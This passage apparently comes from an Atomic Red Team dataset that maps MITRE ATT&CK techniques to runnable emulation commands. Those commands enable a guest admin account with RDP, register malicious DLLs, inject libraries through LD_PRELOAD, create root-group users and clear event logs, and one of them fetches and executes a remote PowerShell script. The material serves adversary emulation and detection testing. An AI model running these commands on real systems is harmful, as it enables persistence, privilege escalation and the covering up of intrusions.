"Domain\\Administrator"}, "destination_address": {"description": "Remote Host IP or Hostname", "type": "string", "default": "Target"}, "password": {"description": "Password", "type": "string", "default": "P@ssw0rd1"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Computer must have Ruby Installed", "prereq_command": "try {if (ruby -v) {exit 0} else {exit 1}} catch {exit 1}", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest  -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubyinstaller-2.7.1-1-x64.exe\" https://github.com/oneclick/rubyinstaller2/releases/download/RubyInstaller-2.7.1-1/rubyinstaller-2.7.1-1-x64.exe\n$file1= \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubyinstaller-2.7.1-1-x64.exe\"\nStart-Process $file1 /S;"}, {"description": "Computer must have Evil-WinRM installed", "prereq_command": "try {if (evil-winrm -h) {exit 0} else {exit 1}} catch {exit 1}", "get_prereq_command": "gem install evil-winrm"}], "executor": {"command": "evil-winrm -i #{destination_address} -u #{user_name} -p #{password}", "name": "powershell", "elevation_required": true}}]}, "T1078.001": {"name": "Default Accounts", "technique_id": "attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d", "external_id": "T1078.001", "data_components": ["User Account Authentication", "Logon Session Creation"], "kill_chain_phases": ["defense-evasion", "persistence", "privilege-escalation", "initial-access"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485"], "description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)\n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)", "atomic_tests": [{"name": "Enable Guest account with RDP capability and admin privileges", "auto_generated_guid": "99747561-ed8d-47f2-9c91-1e5fde1ed6e0", "description": "After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,\nand desktop will allow multiple RDP connections.\n", "supported_platforms": ["windows"], "input_arguments": {"guest_user": {"description": "Specify the guest account", "type": "string", "default": "guest"}, "guest_password": {"description": "Specify the guest password", "type": "string", "default": "Password123!"}, "local_admin_group": {"description": "Specify the admin localgroup name", "type": "string", "default": "Administrators"}, "remote_desktop_users_group_name": {"description": "Specify the remote desktop users group name", "type": "string", "default": "Remote Desktop Users"}, "remove_rdp_access_during_cleanup": {"description": "Set to 1 if you want the cleanup to remove RDP access to machine", "type": "integer", "default": 0}}, "executor": {"command": "net user #{guest_user} /active:yes\nnet user #{guest_user} #{guest_password}\nnet localgroup #{local_admin_group} #{guest_user} /add\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f", "cleanup_command": "net user #{guest_user} /active:no >nul 2>&1\nnet localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /delete >nul 2>&1\nif #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)\nif #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /f >nul 2>&1)\nif #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /f >nul 2>&1)", "name": "command_prompt", "elevation_required": true}}, {"name": "Activate Guest Account", "auto_generated_guid": "aa6cb8c4-b582-4f8e-b677-37733914abda", "description": "The Adversaries can activate the default Guest user. The guest account is inactivated by default\n", "supported_platforms": ["windows"], "input_arguments": {"guest_user": {"description": "Specify the guest account", "type": "string", "default": "guest"}}, "executor": {"command": "net user #{guest_user} /active:yes\n", "cleanup_command": "net user #{guest_user} /active:no\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Enable Guest Account on macOS", "auto_generated_guid": "0315bdff-4178-47e9-81e4-f31a6d23f7e4", "description": "This test enables the guest account on macOS using sysadminctl utility.", "supported_platforms": ["macos"], "executor": {"command": "sudo sysadminctl -guestAccount on", "cleanup_command": "sudo sysadminctl -guestAccount off", "name": "command_prompt", "elevation_required": true}}]}, "T1547.003": {"name": "Time Providers", "technique_id": "attack-pattern--61afc315-860c-4364-825d-0d62b2e91edc", "external_id": "T1547.003", "data_components": ["Process Creation", "Command Execution", "Windows Registry Key Modification", "Module Load"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--a2c36a5d-4058-475e-8e77-fff75e50d3b9"], "description": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\</code>.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)\n\nAdversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)", "atomic_tests": [{"name": "Create a new time provider", "auto_generated_guid": "df1efab7-bc6d-4b88-8be9-91f55ae017aa", "description": "Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n", "supported_platforms": ["windows"], "executor": {"command": "net stop w32time\nCopy-Item \"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n", "cleanup_command": "net stop w32time\nreg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /f\nrm -force C:\\Users\\Public\\AtomicTest.dll\nnet start w32time\n", "name": "powershell", "elevation_required": true}}, {"name": "Edit an existing time provider", "auto_generated_guid": "29e0afca-8d1d-471a-8d34-25512fc48315", "description": "Establishes persistence by editing the NtpServer time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n", "supported_platforms": ["windows"], "executor": {"command": "net stop w32time\nCopy-Item \"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n", "cleanup_command": "net stop w32time\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Windows\\SYSTEM32\\w32time.DLL\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"0\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"0\" /f\nrm -force C:\\Users\\Public\\AtomicTest.dll\nnet start w32time\n", "name": "powershell", "elevation_required": true}}]}, "T1546.005": {"name": "Trap", "technique_id": "attack-pattern--63220765-d418-44de-8fae-694b3912317d", "external_id": "T1546.005", "data_components": ["File Creation", "File Modification", "Process Creation", "Command Execution"], "kill_chain_phases": ["privilege-escalation", "persistence"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.\n\nAdversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where \"command list\" will be executed when \"signals\" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)", "atomic_tests": [{"name": "Trap EXIT", "auto_generated_guid": "a74b2e07-5952-4c03-8b56-56274b076b61", "description": "Launch bash shell with command arg to create TRAP on EXIT.\nThe trap executes script that writes to /tmp/art-fish.txt\n", "supported_platforms": ["macos", "linux"], "executor": {"command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'\n", "cleanup_command": "rm -f /tmp/art-fish.txt\n", "name": "sh"}}, {"name": "Trap EXIT (freebsd)", "auto_generated_guid": "be1a5d70-6865-44aa-ab50-42244c9fd16f", "description": "Launch bash shell with command arg to create TRAP on EXIT.\nThe trap executes script that writes to /tmp/art-fish.txt\n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if bash is installed.\n", "prereq_command": "if [ ! -x \"$(command -v bash)\" ]; then exit 1; else exit 0; fi;\n", "get_prereq_command": "(which pkg && pkg install -y bash)\n"}], "executor": {"command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'\n", "cleanup_command": "rm -f /tmp/art-fish.txt\n", "name": "sh"}}, {"name": "Trap SIGINT", "auto_generated_guid": "a547d1ba-1d7a-4cc5-a9cb-8d65e8809636", "description": "Launch bash shell with command arg to create TRAP on SIGINT (CTRL+C), then send SIGINT signal.\nThe trap executes script that writes to /tmp/art-fish.txt\n", "supported_platforms": ["macos", "linux"], "executor": {"command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'\n", "cleanup_command": "rm -f /tmp/art-fish.txt\n", "name": "sh"}}, {"name": "Trap SIGINT (freebsd)", "auto_generated_guid": "ade10242-1eac-43df-8412-be0d4c704ada", "description": "Launch bash shell with command arg to create TRAP on SIGINT (CTRL+C), then send SIGINT signal.\nThe trap executes script that writes to /tmp/art-fish.txt\n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if bash is installed.\n", "prereq_command": "if [ ! -x \"$(command -v bash)\" ]; then exit 1; else exit 0; fi;\n", "get_prereq_command": "(which pkg && pkg install -y bash)\n"}], "executor": {"command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'\n", "cleanup_command": "rm -f /tmp/art-fish.txt\n", "name": "sh"}}]}, "T1574.006": {"name": "Dynamic Linker Hijacking", "technique_id": "attack-pattern--633a100c-b2c9-41bf-9be5-905c1b16c825", "external_id": "T1574.006", "data_components": ["Command Execution", "File Creation", "Module Load", "Process Creation", "File Modification"], "kill_chain_phases": ["persistence", "privilege-escalation", "defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db"], "description": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.(Citation: Baeldung LD_PRELOAD)\n\nOn Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the <code>export</code> command, <code>setenv</code> function, or <code>putenv</code> function. Adversaries can also leverage [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) to export variables in a shell or set variables programmatically using higher level syntax such Python\u2019s <code>os.environ</code>.\n\nOn Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. <code>LD_PRELOAD</code> can be set via the environment variable or <code>/etc/ld.so.preload</code> file.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries) Libraries specified by <code>LD_PRELOAD</code> are loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code> respectively.(Citation: Code Injection on Linux and macOS)(Citation: Uninformed Needle) (Citation: Phrack halfdead 1997)(Citation: Brown Exploiting Linkers) \n\nOn macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the <code>DYLD_INSERT_LIBRARIES</code> environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) ", "atomic_tests": [{"name": "Shared Library Injection via /etc/ld.so.preload", "auto_generated_guid": "39cb0e67-dd0d-4b74-a74b-c072db7ae991", "description": "This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will echo `../bin/T1574.006.so` to /etc/ld.so.preload. \n", "supported_platforms": ["linux"], "input_arguments": {"path_to_shared_library_source": {"description": "Path to a shared library source code", "type": "path", "default": "PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c"}, "path_to_shared_library": {"description": "Path to a shared library object", "type": "path", "default": "/tmp/T1574006.so"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The shared library must exist on disk at specified location (#{path_to_shared_library})\n", "prereq_command": "if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}\n"}], "executor": {"command": "sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'\n", "cleanup_command": "sudo sed -i 's##{path_to_shared_library}##' /etc/ld.so.preload\n", "name": "bash", "elevation_required": true}}, {"name": "Shared Library Injection via LD_PRELOAD", "auto_generated_guid": "bc219ff7-789f-4d51-9142-ecae3397deae", "description": "This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will utilize LD_PRELOAD to load the shared object library `/etc/ld.so.preload`. Output will be via stdout.\n", "supported_platforms": ["linux"], "input_arguments": {"path_to_shared_library_source": {"description": "Path to a shared library source code", "type": "path", "default": "PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c"}, "path_to_shared_library": {"description": "Path to a shared library object", "type": "path", "default": "/tmp/T1574006.so"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The shared library must exist on disk at specified location (#{path_to_shared_library})\n", "prereq_command": "if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}\n"}], "executor": {"command": "LD_PRELOAD=#{path_to_shared_library} ls\n", "name": "bash"}}, {"name": "Dylib Injection via DYLD_INSERT_LIBRARIES", "auto_generated_guid": "4d66029d-7355-43fd-93a4-b63ba92ea1be", "description": "injects a dylib that opens calculator via env variable\n", "supported_platforms": ["macos"], "input_arguments": {"file_to_inject": {"description": "Path of executable to be injected. Mostly works on non-apple default apps.", "type": "path", "default": "/Applications/Firefox.app/Contents/MacOS/firefox"}, "source_file": {"description": "Path of c source file", "type": "path", "default": "PathToAtomicsFolder/T1574.006/src/MacOS/T1574.006.c"}, "dylib_file": {"description": "Path of dylib file", "type": "path", "default": "/tmp/T1574006MOS.dylib"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "Compile the dylib from (#{source_file}). Destination is #{dylib_file}\n", "prereq_command": "gcc -dynamiclib #{source_file} -o #{dylib_file}\n", "get_prereq_command": "gcc -dynamiclib #{source_file} -o #{dylib_file}\n"}], "executor": {"command": "DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}\n", "cleanup_command": "kill `pgrep Calculator`\nkill `pgrep firefox`\n", "name": "bash", "elevation_required": false}}]}, "T1136.001": {"name": "Local Account", "technique_id": "attack-pattern--635cbe30-392d-4e27-978e-66774357c762", "external_id": "T1136.001", "data_components": ["User Account Creation", "Command Execution", "Process Creation"], "kill_chain_phases": ["persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0"], "description": "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as <code>username</code>.(Citation: cisco_username_cmd)\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.", "atomic_tests": [{"name": "Create a user account on a Linux system", "auto_generated_guid": "40d8eabd-e394-46f6-8785-b9bfa1d011d2", "description": "Create a user via useradd\n", "supported_platforms": ["linux"], "input_arguments": {"username": {"description": "Username of the user to create", "type": "string", "default": "evil_user"}}, "executor": {"command": "useradd -M -N -r -s /bin/bash -c evil_account #{username}\n", "cleanup_command": "userdel #{username}\n", "name": "bash", "elevation_required": true}}, {"name": "Create a user account on a FreeBSD system", "auto_generated_guid": "a39ee1bc-b8c1-4331-8e5f-1859eb408518", "description": "Create a user via pw\n", "supported_platforms": ["linux"], "input_arguments": {"username": {"description": "Username of the user to create", "type": "string", "default": "evil_user"}}, "executor": {"command": "pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account\n", "cleanup_command": "rmuser -y #{username}\n", "name": "sh", "elevation_required": true}}, {"name": "Create a user account on a MacOS system", "auto_generated_guid": "01993ba5-1da3-4e15-a719-b690d4f0f0b2", "description": "Creates a user on a MacOS system with dscl\n", "supported_platforms": ["macos"], "input_arguments": {"username": {"description": "Username of the user to create", "type": "string", "default": "evil_user"}, "realname": {"description": "'realname' to record when creating the user", "type": "string", "default": "Evil Account"}}, "executor": {"command": "dscl . -create /Users/#{username}\ndscl . -create /Users/#{username} UserShell /bin/zsh\ndscl . -create /Users/#{username} RealName \"#{realname}\"\ndscl . -create /Users/#{username} UniqueID \"1010\"\ndscl . -create /Users/#{username} PrimaryGroupID 80\ndscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}\n", "cleanup_command": "dscl . -delete /Users/#{username}\n", "name": "bash", "elevation_required": true}}, {"name": "Create a new user in a command prompt", "auto_generated_guid": "6657864e-0323-4206-9344-ac9cd7265a4f", "description": "Creates a new user in a command prompt. Upon execution, \"The command completed successfully.\" will be displayed. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_CMD\"\n", "supported_platforms": ["windows"], "input_arguments": {"username": {"description": "Username of the user to create", "type": "string", "default": "T1136.001_CMD"}, "password": {"description": "Password of the user to create", "type": "string", "default": "T1136.001_CMD!"}}, "executor": {"command": "net user /add \"#{username}\" \"#{password}\"\n", "cleanup_command": "net user /del \"#{username}\" >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Create a new user in PowerShell", "auto_generated_guid": "bc8be0ac-475c-4fbf-9b1d-9fffd77afbde", "description": "Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_PowerShell\"\n", "supported_platforms": ["windows"], "input_arguments": {"username": {"description": "Username of the user to create", "type": "string", "default": "T1136.001_PowerShell"}}, "executor": {"command": "New-LocalUser -Name \"#{username}\" -NoPassword\n", "cleanup_command": "Remove-LocalUser -Name \"#{username}\" -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Create a new user in Linux with `root` UID and GID.", "auto_generated_guid": "a1040a30-d28b-4eda-bd99-bb2861a4616c", "description": "Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n", "supported_platforms": ["linux"], "input_arguments": {"username": {"description": "Username of the user to create", "type": "string", "default": "butter"}, "password": {"description": "Password of the user to create", "type": "string", "default": "BetterWithButter"}}, "executor": {"command": "useradd -g 0 -M -d /root -s /bin/bash #{username}\nif [ $(cat /etc/os-release | grep -i 'Name=\"ubuntu\"') ]; then echo \"#{username}:#{password}\" | sudo chpasswd; else echo \"#{password}\" | passwd --stdin #{username}; fi;\n", "cleanup_command": "userdel #{username}\n", "name": "bash", "elevation_required": true}}, {"name": "Create a new user in FreeBSD with `root` GID.", "auto_generated_guid": "d141afeb-d2bc-4934-8dd5-b7dba0f9f67a", "description": "Creates a new user in FreeBSD and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n", "supported_platforms": ["linux"], "input_arguments": {"username": {"description": "Username of the user to create", "type": "string", "default": "butter"}, "password": {"description": "Password of the user to create", "type": "string", "default": "BetterWithButter"}}, "executor": {"command": "pw useradd #{username} -g 0 -d /root -s /bin/sh\necho \"#{password}\" | pw usermod #{username} -h 0\n", "cleanup_command": "pw userdel #{username}\n", "name": "sh", "elevation_required": true}}, {"name": "Create a new Windows admin user", "auto_generated_guid": "fda74566-a604-4581-a4cc-fbbe21d66559", "description": "Creates a new admin user in a command prompt.\n", "supported_platforms": ["windows"], "input_arguments": {"username": {"description": "Username of the user to create", "type": "string", "default": "T1136.001_Admin"}, "password": {"description": "Password of the user to create", "type": "string", "default": "T1136_pass"}}, "executor": {"command": "net user /add \"#{username}\" \"#{password}\"\nnet localgroup administrators \"#{username}\" /add\n", "cleanup_command": "net user /del \"#{username}\" >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}]}, "T1070.001": {"name": "Clear Windows Event Logs", "technique_id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2", "external_id": "T1070.001", "data_components": ["Command Execution", "OS API Execution", "File Deletion"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--20a2baeb-98c2-4901-bad7-dc62d0a03dea", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157"], "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\nThe event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging. Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)", "atomic_tests": [{"name": "Clear Logs", "auto_generated_guid": "e6abb60e-26b8-41da-8aae-0c35174b0967", "description": "Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty.\n", "supported_platforms": ["windows"], "input_arguments": {"log_name": {"description": "Windows Log Name, ex System", "type": "string", "default": "System"}}, "executor": {"command": "wevtutil cl #{log_name}\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Delete System Logs Using Clear-EventLog", "auto_generated_guid": "b13e9306-3351-4b4b-a6e8-477358b0b498", "description": "Clear event logs using built-in PowerShell commands.\nUpon successful execution, you should see the list of deleted event logs\nUpon execution, open the Security.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty or has very few logs in it.\n", "supported_platforms": ["windows"], "executor": {"command": "$logs = Get-EventLog -List | ForEach-Object {$_.Log}\n$logs | ForEach-Object {Clear-EventLog -LogName $_ }\nGet-EventLog -list\n", "name": "powershell", "elevation_required": true}}, {"name": "Clear Event Logs via VBA", "auto_generated_guid": "1b682d84-f075-4f93-9a89-8a8de19ffd6e", "description": "This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. \n\nElevation is required for this module to execute properly, otherwise WINWORD will throw an \"Access Denied\" error\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Microsoft Word must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"}], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"\n", "name": "powershell", "elevation_required": true}}]}, "T1557.001": {"name": "LLMNR/NBT-NS Poisoning and SMB Relay", "technique_id": "attack-pattern--650c784b-7504-4df7-ab2c-4ea882384d1e", "external_id": "T1557.001", "data_components": ["Windows Registry Key Modification", "Network Traffic Flow", "Network Traffic Content", "Service Creation"], "kill_chain_phases": ["credential-access", "collection"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c", "course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d", "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.\n\nIn some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials 